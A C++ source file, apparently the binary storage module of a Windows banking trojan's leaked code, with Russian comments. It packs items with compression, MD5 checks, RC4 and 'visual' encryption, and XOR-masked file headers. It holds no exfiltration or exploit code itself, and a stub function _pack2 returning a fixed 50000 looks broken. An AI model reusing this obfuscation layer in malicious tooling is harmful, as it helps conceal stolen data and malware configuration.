#include <windows.h>

#include "binstorage.h"

#define SHF_REMOVED 0x1 //Элемент удален.

#pragma pack(push, 1)
//Заголовок для элемента в хранилище.
typedef struct
{
  DWORD size;  //Размер элемента.
  BYTE flags;  //Флаги SHF_*.
}STORAGEARRAYHEADER;
#pragma pack(pop)

void BinStorage::init(void)
{

}

void BinStorage::uninit(void)
{

}

bool BinStorage::_checkHash(STORAGE *binStorage)
{
  BYTE md5Hash[MD5HASH_SIZE];
  Crypt::_md5Hash(md5Hash, ((LPBYTE)binStorage) + sizeof(STORAGE), binStorage->size - sizeof(STORAGE));
  return (Mem::_compare(md5Hash, binStorage->md5Hash, MD5HASH_SIZE) == 0) ? true : false;
}

BinStorage::STORAGE *BinStorage::_createEmpty(void)
{
  STORAGE *p = (STORAGE *)Mem::alloc(sizeof(STORAGE));
  if(p)p->size = sizeof(STORAGE);
  return p;
}

bool BinStorage::_addItem(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize)
{
  DWORD newStorageSize = (*binStorage)->size + sizeof(ITEM) + dataSize;
  if(newStorageSize > (*binStorage)->size /*не пошло ли по кругу*/ && id > 0 && Mem::reallocEx(binStorage, newStorageSize))
  {
    STORAGE *p = *binStorage;
    ITEM *item = (ITEM *)(((LPBYTE)p) + p->size);
    LPBYTE dest = (LPBYTE)(item) + sizeof(ITEM);
      
    //Сжимаем.
    if(dataSize == 0)flags &= ~ITEMF_COMPRESSED;

    if(flags & ITEMF_COMPRESSED)
    {
      item->size = dataSize;
      int r = UCL::_Compress((LPBYTE)data, dataSize, dest, &item->size, NULL, UCL::CF_NRV2B | UCL::CF_LEVEL_MAX);
      if(r == UCL::E_OUT_OF_BUFFER)flags &= ~ITEMF_COMPRESSED;
      else if(r != UCL::E_SUCCESSED)return false;
    }

    if((flags & ITEMF_COMPRESSED) == 0)
    {
      item->size = dataSize;
      if(dataSize > 0)Mem::_copy(dest, data, dataSize);
    }

    DWORD fullItemSize = sizeof(ITEM) + item->size;
    if((newStorageSize = p->size + fullItemSize) <= BINSTORAGE_MAX_SIZE)
    {
      item->id       = id;
      item->flags    = flags;
      item->realSize = dataSize;
      
      p->size = newStorageSize;
      p->count++;
      return true;
    }
  }
  return false;
}

bool BinStorage::_addItemAsUtf8StringW(STORAGE **binStorage, DWORD id, DWORD flags, LPWSTR string)
{
  bool r = false;
  Str::UTF8STRING u8s;
  
  if(Str::_utf8FromUnicode(string, -1, &u8s))
  {
    r = _addItem(binStorage, id, flags, u8s.data, u8s.size);
    Str::_utf8Free(&u8s);
  }

  return r;
}

bool BinStorage::_addItemAsUtf8StringA(STORAGE **binStorage, DWORD id, DWORD flags, LPSTR string)
{
  bool r = false;
  Str::UTF8STRING u8s;

  if(Str::_utf8FromAnsi(string, -1, &u8s))
  {
    r = _addItem(binStorage, id, flags, u8s.data, u8s.size);
    Str::_utf8Free(&u8s);
  }

  return r;
}

bool BinStorage::_modifyItem(STORAGE **binStorage, ITEM *item, DWORD flags, void *data, DWORD dataSize)
{
  DWORD itemOffset       = (DWORD)((DWORD_PTR)item - (DWORD_PTR)*binStorage);
  DWORD endOfItemOffset  = itemOffset + sizeof(ITEM) + item->size;
  STORAGE *newBinStorage = (STORAGE *)Mem::copyEx(*binStorage, itemOffset);

  if(newBinStorage != NULL)
  {
    newBinStorage->size = itemOffset;
    newBinStorage->count--; //Т.к. на прежнее значение его вернет _addItem().
    
    if(_addItem(&newBinStorage, item->id, flags, data, dataSize))
    {
      DWORD copySize = (*binStorage)->size - endOfItemOffset;
      if(copySize > 0 && Mem::reallocEx(&newBinStorage, newBinStorage->size + copySize))
      {
        Mem::_copy((LPBYTE)newBinStorage + newBinStorage->size, (LPBYTE)*binStorage + endOfItemOffset, copySize);
        newBinStorage->size += copySize;
        copySize = 0;
      }
      
      if(copySize == 0 && newBinStorage->size <= BINSTORAGE_MAX_SIZE)
      {
        Mem::free(*binStorage);
        *binStorage = newBinStorage;
        return true;
      }
    }
    Mem::free(newBinStorage);
  }

  return false;
}

bool BinStorage::_modifyItemById(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize)
{
  ITEM *item = _getItem(*binStorage, id, flags & ITEMF_IS_MASK);
  if(item != NULL)return _modifyItem(binStorage, item, flags, data, dataSize);
  return false;
}

BinStorage::ITEM *BinStorage::_getNextItem(const STORAGE *binStorage, ITEM *curItem)
{
  if(curItem == NULL)
  {
    if(binStorage->count == 0 || binStorage->size < sizeof(STORAGE) + sizeof(ITEM))return NULL;
    curItem = (ITEM *)((LPBYTE)binStorage + sizeof(STORAGE));
  }
  else curItem = (ITEM *)((LPBYTE)curItem + sizeof(ITEM) + curItem->size);
    
  DWORD_PTR offset = (DWORD_PTR)((LPBYTE)curItem - (LPBYTE)binStorage) + sizeof(ITEM);
  if(offset <= binStorage->size && offset + curItem->size <= binStorage->size)return curItem;
  return NULL;
}

BinStorage::ITEM *BinStorage::_getItem(const STORAGE *binStorage, DWORD id, DWORD isFlag)
{
  ITEM *cur = NULL;
  while((cur = _getNextItem(binStorage, cur)) != NULL)if(cur->id == id && isFlag == (cur->flags & ITEMF_IS_MASK))return cur;
  return NULL;
}

void *BinStorage::_getItemData(const ITEM *item)
{
  void *p = NULL;
  if(item->realSize > 0 && (p = Mem::alloc(item->realSize + sizeof(WCHAR))))
  {
    LPBYTE data = (LPBYTE)item + sizeof(ITEM);
    if(item->flags & ITEMF_COMPRESSED)
    {
      DWORD rs = item->realSize;
      if(!UCL::_DecompressNRV2B(data, item->size, (LPBYTE)p, &rs))
      {
        Mem::free(p);
        p = NULL;
      }
    }
    else Mem::_copy(p, data, item->realSize);
  }
  return p;
}

void *BinStorage::_getItemDataEx(const STORAGE *binStorage, DWORD id, DWORD isFlag, LPDWORD size)
{
  void *p = NULL;
  ITEM *i = _getItem(binStorage, id, isFlag);
  if(i && (p = _getItemData(i)) && size)*size = i->realSize;
  return p;
}

bool BinStorage::_getItemDataAsDword(const STORAGE *binStorage, DWORD id, DWORD isFlag, LPDWORD data)
{
  bool r = false;
  ITEM *item = _getItem(binStorage, id, isFlag);
  if(item != NULL && item->realSize == sizeof(DWORD))
  {
    if(data == NULL)r = true;
    else
    {
      LPBYTE offset = (LPBYTE)item + sizeof(ITEM);
      if(item->flags & ITEMF_COMPRESSED)
      {
        DWORD rs = sizeof(DWORD);
        r = UCL::_DecompressNRV2B(offset, item->size, (LPBYTE)data, &rs);
      }
      else
      {
        *data = *((LPDWORD)offset);
        r = true;
      }
    }
  }
  return r;
}


DWORD BinStorage::_pack2(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key)
{ //DWORD size = binStorage->size; 
return 50000;}

DWORD BinStorage::_pack(STORAGE **binStorage, DWORD flags, Crypt::RC4KEY *rc4Key)
{  
  STORAGE *oldStorage = *binStorage;
  ITEM *curItem = NULL;

  /*
    Приминение флагов ITEMF_COMBINE_*.
    
    FIXME: Разработать оптимизацию даже при !(dwFlags & PACKF_FINAL_MODE).
  */
  if(flags & PACKF_FINAL_MODE)while((curItem = _getNextItem(oldStorage, curItem)))if(curItem->id > 0)
  {
    if(curItem->flags & (ITEMF_COMBINE_DELETE | ITEMF_COMBINE_REPLACE))
    {
      curItem->id = 0;
      continue;
    }

    //Снимаем маску.
    curItem->flags &= ~ITEMF_COMBINE_MASK;

    //Применяем маску.
    DWORD itemMask = curItem->flags & ITEMF_IS_MASK;
    ITEM *cloneOfItem = curItem;
    while((cloneOfItem = _getNextItem(oldStorage, cloneOfItem)))if(cloneOfItem->id == curItem->id && (cloneOfItem->flags & ITEMF_IS_MASK) == itemMask)
    {
      if(cloneOfItem->flags & (ITEMF_COMBINE_OVERWRITE | ITEMF_COMBINE_REPLACE | ITEMF_COMBINE_DELETE))
      {
        curItem->id = 0;
        if(cloneOfItem->flags & ITEMF_COMBINE_DELETE)cloneOfItem->id = 0;
        else cloneOfItem->flags &= ~ITEMF_COMBINE_MASK;
        break;
      }
      else /*if(cloneOfItem->flags & ITEMF_COMBINE_ADD)*/ cloneOfItem->id = 0;      
    }
  }
  
  //Создаем чистый список.
  STORAGE *newStorage;
  if((newStorage = _createEmpty()))
  {
    curItem = NULL;
    bool r = true;
    while((curItem = _getNextItem(oldStorage, curItem)))if(curItem->id > 0)
    {
      DWORD size = curItem->size + sizeof(ITEM);
      if(!Mem::reallocEx(&newStorage, newStorage->size + size))
      {
        r = false;
        break;
      }
      
      ITEM *item = (ITEM *)(((LPBYTE)newStorage) + newStorage->size);
      item->id       = curItem->id;
      item->flags    = curItem->flags;
      item->size     = curItem->size;
      item->realSize = curItem->realSize;
      if(item->size > 0)Mem::_copy(((LPBYTE)item) + sizeof(ITEM), ((LPBYTE)curItem) + sizeof(ITEM), item->size);
      
      newStorage->count++;
      newStorage->size += size;
    }

    if(r == false || !Crypt::_md5Hash(newStorage->md5Hash, ((LPBYTE)newStorage) + sizeof(STORAGE), newStorage->size - sizeof(STORAGE)))
    {
      Mem::free(newStorage);
    }
    else
    {
      Crypt::_generateBinaryData(newStorage->randData, sizeof(newStorage->randData), 0, 0xFF, false);
      
      DWORD size = newStorage->size;
      if(rc4Key != NULL)
      {
        Crypt::_visualEncrypt(newStorage, size);

        Crypt::RC4KEY key;
        Mem::_copy(&key, rc4Key, sizeof(Crypt::RC4KEY));
        Crypt::_rc4(newStorage, size, &key);
      }
      
      Mem::free(oldStorage);
      *binStorage = newStorage;
      return size;
    }
  } 
  return 0;
}

DWORD BinStorage::_unpack(STORAGE **binStorage, void *data, DWORD dataSize, Crypt::RC4KEY *rc4Key)
{
  if(dataSize >= sizeof(STORAGE) && dataSize <= BINSTORAGE_MAX_SIZE)
  {
    //Делаем копию ключа.
    Crypt::RC4KEY key;
    if(rc4Key)Mem::_copy(&key, rc4Key, sizeof(Crypt::RC4KEY));
    
    if(binStorage == NULL)
    {
      if(rc4Key != NULL)
      {
        Crypt::_rc4(data, dataSize, &key);
        Crypt::_visualDecrypt(data, dataSize);
      }
      if(((STORAGE *)data)->size <= dataSize && _checkHash(((STORAGE *)data)))return ((STORAGE *)data)->size;
    }
    else if((*binStorage) = (STORAGE *)Mem::alloc(dataSize))
    {
      Mem::_copy(*binStorage, data, dataSize);
      if(rc4Key != NULL)
      {
        Crypt::_rc4(*binStorage, dataSize, &key);
        Crypt::_visualDecrypt(*binStorage, dataSize);
      }
      if((*binStorage)->size <= dataSize && _checkHash(*binStorage))return (*binStorage)->size;
      Mem::free(*binStorage);
    }
  }
  
  if(binStorage)*binStorage = NULL;
  return 0;
}

DWORD BinStorage::_unpackFromFile(STORAGE **binStorage, LPWSTR fileName, Crypt::RC4KEY *rc4Key)
{
  DWORD size = 0;
  Fs::MEMFILE mf;
  if(Fs::_fileToMem(fileName, &mf, 0))
  {
    size = _unpack(binStorage, mf.data, mf.size, rc4Key);
    Fs::_closeMemFile(&mf);
  }
  return size;
}

BinStorage::STORAGE *BinStorage::_combine(STORAGE *binStorage1, STORAGE *binStorage2)
{
  if(binStorage1 && binStorage2 && binStorage1->size >= sizeof(STORAGE) && binStorage2->size >= sizeof(STORAGE))  
  {
    DWORD newSize = binStorage1->size + binStorage2->size - sizeof(STORAGE);
    if(newSize <= BINSTORAGE_MAX_SIZE)
    {
      STORAGE *newStorage = (STORAGE *)Mem::alloc(newSize);
      if(newStorage)
      {
        newStorage->size  = newSize;
        newStorage->flags = 0;
        newStorage->count = binStorage1->count + binStorage2->count;

        LPBYTE cur = ((LPBYTE)newStorage) + sizeof(STORAGE);
        Mem::_copy(cur, ((LPBYTE)binStorage1) + sizeof(STORAGE), binStorage1->size - sizeof(STORAGE));

        cur = ((LPBYTE)newStorage) /*+ sizeof(STORAGE)*/ + binStorage1->size /*- sizeof(STORAGE)*/;
        Mem::_copy(cur, ((LPBYTE)binStorage2) + sizeof(STORAGE), binStorage2->size - sizeof(STORAGE));

        return newStorage;
      }
    }
  }
  return NULL;
}

bool BinStorage::_openStorageArray(LPWSTR fileName, DWORD flags, STORAGEARRAY *storageArray)
{
  DWORD desiredAccess = GENERIC_READ;
  DWORD creationDisposition;
  bool retVal = false;
  
  //Права доступа.
  if(flags & OSF_WRITE_ACCESS)
  {
    desiredAccess       |= GENERIC_WRITE;
    creationDisposition  = OPEN_ALWAYS;
  }
  else
  {
    creationDisposition = OPEN_EXISTING;
  }
  
  //Открываем файл.
  storageArray->file = CWA(kernel32, CreateFileW)(fileName, desiredAccess, FILE_SHARE_READ, NULL, creationDisposition, FILE_ATTRIBUTE_NORMAL, NULL);
  if(storageArray->file != INVALID_HANDLE_VALUE)
  {
    DWORD64 fileSize;
    
    if((fileSize = Fs::_getFileSize(storageArray->file)) != (DWORD64)-1)
    {
      if(fileSize == 0)retVal = true;
      else
      {
        //Проверка на ошибки.
        STORAGEARRAYHEADER sh;
        DWORD readed;
        DWORD64 offset = 0, newOffset;
        
        for(;;)
        {
          if(!CWA(kernel32, ReadFile)(storageArray->file, &sh, sizeof(STORAGEARRAYHEADER), &readed, NULL))
          {
            //Не удалось прочитать файл.
            #if defined(WDEBUG3)
            WDEBUG3(WDDT_ERROR, "(1)Failed to read \"%s\", position %I64u, size %I64u", fileName, Fs::_getFilePointer(storageArray->file), fileSize);
            #endif
            
            goto CHECK_END;
          }
          
          //EOF. Файл успешно прочитан.
          if(readed == 0)
          {
            retVal = true;
            goto CHECK_END; 
          }
          
          //Если не удалось прочитать размер
          if(readed != sizeof(STORAGEARRAYHEADER))
          {
            #if defined(WDEBUG4)
            WDEBUG4(WDDT_ERROR, "(2)Failed to read file \"%s\", position %I64u, size %I64u, readed=%u", fileName, Fs::_getFilePointer(storageArray->file), fileSize, readed);
            #endif
            
            //Восстанавливаем до конца предидущей конигурации.
            goto RESTORE_FILE1;
          }
          
          sh.size  ^= storageArray->xorKey;
          newOffset = offset + sizeof(STORAGEARRAYHEADER) + sh.size;
          
          //Файл поврежден.
          if(newOffset > fileSize || sh.size > BINSTORAGE_MAX_SIZE)
          {
            #if defined(WDEBUG4)
            WDEBUG4(WDDT_ERROR, "(2)File corrupted \"%s\", position %I64u, size %I64u, newOffset=%I64u", fileName, Fs::_getFilePointer(storageArray->file), fileSize, newOffset);
            #endif
            
            //Восстанавливаем до конца предидущей конигурации.
            goto RESTORE_FILE1;
          }
          
          if(!Fs::_setFilePointer(storageArray->file, sh.size, FILE_CURRENT))
          {
            #if defined(WDEBUG4)
            WDEBUG4(WDDT_ERROR, "(2)Failed to change pointer in file \"%s\", position %I64u, size %I64u, sh.size=%u", fileName, Fs::_getFilePointer(storageArray->file), fileSize, sh.size);
            #endif
            
            goto CHECK_END;
          }
          
          offset = newOffset;
        }

RESTORE_FILE1:
        //Восстанавливаем до конца текушей конфигурации.
        if(flags & OSF_WRITE_ACCESS && Fs::_setFilePointer(storageArray->file, offset, FILE_BEGIN) && CWA(kernel32, SetEndOfFile)(storageArray->file))retVal = true;  

CHECK_END:;
      }
    }

    if(retVal == false)
    {
      CWA(kernel32, CloseHandle)(storageArray->file);
      storageArray->file = INVALID_HANDLE_VALUE;
    }
    else _resetStorageArrayPointer(storageArray);
  }

  return retVal;
}

void BinStorage::_closeStorageArray(STORAGEARRAY *storageArray)
{
  if(storageArray && storageArray->file != INVALID_HANDLE_VALUE)
  {
    CWA(kernel32, FlushFileBuffers)(storageArray->file);
    CWA(kernel32, CloseHandle)(storageArray->file);
    storageArray->file = INVALID_HANDLE_VALUE;
  }
}

bool BinStorage::_addToStorageArray(STORAGEARRAY *storageArray, STORAGE *binStorage, DWORD size)
{
  bool retVal = false;
  if(size <= BINSTORAGE_MAX_SIZE)
  {
    DWORD64 oldOffset = Fs::_getFilePointer(storageArray->file);
    if(oldOffset != (DWORD64)-1 && Fs::_setFilePointer(storageArray->file, 0, FILE_END))
    {
      DWORD64 curOffset = Fs::_getFilePointer(storageArray->file);
      if(curOffset != (DWORD64)-1)
      {
        DWORD written;

        //Создаем заголовок.
        STORAGEARRAYHEADER sh;
        Mem::_zero(&sh, sizeof(STORAGEARRAYHEADER));
        sh.size = size ^ storageArray->xorKey;

        //Пишим.    
        if(CWA(kernel32, WriteFile)(storageArray->file, &sh, sizeof(STORAGEARRAYHEADER), &written, NULL) && written == sizeof(STORAGEARRAYHEADER) &&
           CWA(kernel32, WriteFile)(storageArray->file, binStorage, size, &written, NULL) && written == size)
        {
          retVal = true;
        }
        else
        {
          //Восстанавливаем конец файла.
          Fs::_setFilePointer(storageArray->file, curOffset, FILE_BEGIN);
          CWA(kernel32, SetEndOfFile)(storageArray->file);
        }
      }
      
      CWA(kernel32, FlushFileBuffers)(storageArray->file);
      Fs::_setFilePointer(storageArray->file, oldOffset, FILE_BEGIN);
    }
  }

  return retVal;
}

void BinStorage::_resetStorageArrayPointer(STORAGEARRAY *storageArray)
{
  storageArray->curItem = (DWORD64)-1;
  Fs::_setFilePointer(storageArray->file, 0, FILE_BEGIN);
}

bool BinStorage::_getNextFromStorageArray(STORAGEARRAY *storageArray, STORAGE **binStorage, LPDWORD size, Crypt::RC4KEY *rc4Key)
{
  DWORD readed;
  STORAGEARRAYHEADER sh;
  
  for(;;)
  {
    DWORD64 curItem = Fs::_getFilePointer(storageArray->file);
    if(!CWA(kernel32, ReadFile)(storageArray->file, &sh, sizeof(STORAGEARRAYHEADER), &readed, NULL))
    {
      //Не удалось прочитать файл.
#     if defined(WDEBUG1)
      WDEBUG1(WDDT_ERROR, "(1)Failed to read position %I64u", Fs::_getFilePointer(storageArray->file));
#     endif
      break;
    }

    //EOF
    if(readed == 0)
    {
      *size = 0;
      return true;
    }
  
    //Если не удалось прочитать размер
    if(readed != sizeof(STORAGEARRAYHEADER))
    {
      //Не удалось прочитать файл.
#     if defined(WDEBUG1)
      WDEBUG1(WDDT_ERROR, "(2)Failed to read position %I64u", Fs::_getFilePointer(storageArray->file));
#     endif
      break;
    }
    
    //Получаем размер.
    sh.size ^= storageArray->xorKey;
    if(sh.size > BINSTORAGE_MAX_SIZE)
    {
#     if defined(WDEBUG1)
      WDEBUG1(WDDT_ERROR, "(3)Failed to read position %I64u", Fs::_getFilePointer(storageArray->file));
#     endif
      break;
    }
    
    //Проверяем не удален ли элемент.
    if(sh.flags & SHF_REMOVED || sh.size == 0)
    {
      if(!Fs::_setFilePointer(storageArray->file, sh.size, FILE_CURRENT))
      {
#       if defined(WDEBUG1)
        WDEBUG1(WDDT_ERROR, "(4)Failed to read position %I64u", Fs::_getFilePointer(storageArray->file));
#       endif
        break;
      }
      continue;
    }
    
    //Выделяем память
    void *p = Mem::alloc(sh.size);
    if(p == NULL)break;
  
    if(!CWA(kernel32, ReadFile)(storageArray->file, p, sh.size, &readed, NULL) || readed != sh.size || (readed = _unpack(NULL, p, sh.size, rc4Key)) == 0)
    {
      //Не удалось прочитать файл.
#     if defined(WDEBUG1)
      WDEBUG1(WDDT_ERROR, "(5)Failed to read position %I64u", Fs::_getFilePointer(storageArray->file));
#     endif
      Mem::free(p);
      break;
    }
    
    *binStorage  = (STORAGE *)p;
    *size        = readed;
    storageArray->curItem = curItem;
    return true;
  }
  
  return false; 
}

bool BinStorage::_removeCurrentFromStorageArray(STORAGEARRAY *storageArray)
{
  bool retVal = false;
  if(storageArray->curItem != (DWORD64)-1)
  {
    DWORD64 oldOffset = Fs::_getFilePointer(storageArray->file);
    if(oldOffset != (DWORD64)-1 && Fs::_setFilePointer(storageArray->file, storageArray->curItem, FILE_BEGIN))
    {
      STORAGEARRAYHEADER sh;
      DWORD rw;
      
      if(CWA(kernel32, ReadFile)(storageArray->file, &sh, sizeof(STORAGEARRAYHEADER), &rw, NULL) && rw == sizeof(STORAGEARRAYHEADER))
      {
        sh.flags |= SHF_REMOVED;
        if(Fs::_setFilePointer(storageArray->file, storageArray->curItem, FILE_BEGIN) &&
           CWA(kernel32, WriteFile)(storageArray->file, &sh, sizeof(STORAGEARRAYHEADER), &rw, NULL) && rw == sizeof(STORAGEARRAYHEADER))
        {
          CWA(kernel32, FlushFileBuffers)(storageArray->file);
          retVal = true;
        }
      }
      Fs::_setFilePointer(storageArray->file, oldOffset, FILE_BEGIN);
    }
  }
  return retVal;
}
